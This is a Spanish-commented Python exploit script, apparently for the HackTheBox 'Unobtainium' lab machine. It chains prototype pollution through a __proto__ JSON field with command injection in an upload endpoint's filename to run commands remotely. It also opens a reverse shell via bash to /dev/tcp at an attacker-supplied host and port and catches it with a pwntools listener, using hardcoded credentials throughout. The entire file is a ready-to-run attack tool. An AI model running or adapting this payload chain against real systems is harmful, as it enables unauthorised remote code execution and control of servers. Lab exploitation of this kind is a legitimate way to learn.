#!/usr/bin/python3

import signal, threading
import argparse
import requests
import base64
import json
from pwn import *

# Variables globales --------------------------.
url_base = "http://unobtainium.htb:31337"
session = requests.Session()

# Clases --------------------------------------.
class Color:  # Paleta de colores
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'

# Funciones -----------------------------------.
def def_handler(sig, frame):  # Controlamos salida usando Ctrl+C
    print(Color.RED + "ssAli3ndO..." + Color.END)
    exit(1)

signal.signal(signal.SIGINT, def_handler)

def arguments():  # Argumentos que recibe el programa
    parse = argparse.ArgumentParser()
    parse.add_argument('-i', dest='lhost', type=str, help='IP to generate reverse shell')
    parse.add_argument('-p', dest='lport', type=int, help='Port to generate reverse shell')
    parse.add_argument('-m', dest='mode', choices=['rce', 'shell'], type=str, help='What are you going to do? RCE or get a SHELL?')
    parse.add_argument('-c', dest='command', default='id', type=str, help='Command to execute in docker container (default: id)')
    args = parse.parse_args()

    if args.mode != "rce" and args.mode != "shell":
        print("Uso:")
        print("\trce: {0} -m rce -c <command>\n\tshell: {0} -m shell -i <attacker_ip> -p <attacker_port>\n".format(sys.argv[0]))
        print("Ejemplo:\n\t{0} -m rce -c id\n\t{0} -m shell -i 10.10.141.141 -p 4433".format(sys.argv[0]))
        exit(1)

    return args

def todo(filename):  # /todo, vemos el contenido de algun comando.
    while True:
        url = url_base + '/todo'

        json_post = {
            "auth": {
                "name": "felamos",
                "password": "Winter2021"
            },
            "filename": filename
        }
        try:
            r = session.post(url, json=json_post, timeout=2)
            print(Color.YELLOW + json.loads(r.text)["content"] + Color.END)
            break
        except requests.exceptions.Timeout:
            pass

def put_message():  # /, subimos algún mensaje, acá nos asignamos el objeto `canUpdate:true`
    url = url_base + '/'

    json_put = {
        "auth": {
            "name": "felamos",
            "password": "Winter2021"
        },
        "message": {
            "text": "hola",
            "__proto__": {
                "canUpload": "true"
            }
        }
    }
    r = session.put(url, json=json_put)

def upload_rce(command):  # /upload, subimos archivo, acá ejecutamos comandos en el sistema
    url = url_base + '/upload'

    json_post = {
        "auth": {
            "name": "felamos",
            "password": "Winter2021"
        },
        "filename": command
    }
    while True:
        r = session.post(url, json=json_post)
        if "Uploaded_File" in r.text:
            break

def process_to_shell(lhost, lport):  # Controlamos el proceso para obtener una shell en el script
    put_message()
    upload_rce("& bash -c 'bash >& /dev/tcp/%s/%d 0>&1'" % (lhost, lport))

# Inicio del programa -------------------------.
if __name__ == '__main__':
    args = arguments()

    try:
        r = requests.get(url_base)
    except:
        print("[" + Color.RED + "-" + Color.END + "] Agrega '10.10.10.235 unobtainium.htb' a tu archivo '/etc/hosts'.")
        exit(1)

    banner = base64.b64decode("CuKVpSAg4pWl4pWT4pWWIOKVpeKVk+KUgOKUgOKVluKVk+KUgOKUgOKVluKVk+KUgOKUgOKVluKVk+KUgOKUgOKVluKUgOKVpeKUgCDilZPilZYg4pWl4pSA4pWl4pSAIOKVpSAg4pWl4pWT4pWW4pWT4pWWCuKVkSAg4pWR4pWR4pWRIOKVkeKVkSAg4pWR4pWR4pSA4pSA4pWc4pWZIOKVkeKVnOKVkSAg4pWrIOKVkSAg4pWR4pWRIOKVkSDilZEgIOKVkSAg4pWR4pWR4pWR4pWr4pWRCuKVqyAg4pWR4pWR4pWrIOKVkeKVqyAg4pWR4pWr4pSA4pSA4pWWICDilZEg4pWR4pSA4pSA4pWiIOKVkSAg4pWR4pWrIOKVkSDilZEgIOKVqyAg4pWR4pWR4pWR4pWr4pWRCuKVmeKUgOKUgOKVnOKVqOKVmeKUgOKVnOKVmeKUgOKUgOKVnOKVqOKUgOKUgOKVnCDilIDilagg4pWoICDilajilIDilajilIDilIDilajilZnilIDilZzilIDilajilIDilIDilZnilIDilIDilZzilajilZnilZzilajigKIgYnkgbGFuegoKSGFja1RoZUJveCAtIFVub2J0YWluaXVtIC4uLiBQcm90b3R5cGUgUG9sbHV0aW9uIChsb2Rhc2gubWVyZ2UpICsgQ29tbWFuZCBJbmplY3Rpb24gKGdvb2dsZS1jbG91ZHN0b3JhZ2UtY29tbWFuZHMpID0gUkNFCg==").decode()
    print(Color.BLUE + banner + Color.END)

    # Ejecucion remota de comandos
    if args.mode == 'rce':
        put_message()
        filename = "holiwis.txt"
        upload_rce("& %s > %s" % (args.command, filename))
        todo("%s" % (filename))
        upload_rce("& rm -r  %s" % (filename)) # Borramos archivo

    # Generamos shell en el propio script
    elif args.mode == 'shell':
        if args.lhost is None or args.lport is None:
            print("[!] Agrega tu IP (-i) y puerto (-p)\n")
            exit(1)

        try:
            threading.Thread(target=process_to_shell, args=(args.lhost, args.lport,)).start()
        except Exception as e:
            log.error(str(e))

        shell = listen(args.lport, timeout=20).wait_for_connection()

        if shell.sock is None:
            log.failure(Color.RED + "La conexión no se ha obtenido..." + Color.END)
            exit(1)

        shell.sendline("export TERM=xterm")

        shell.interactive()
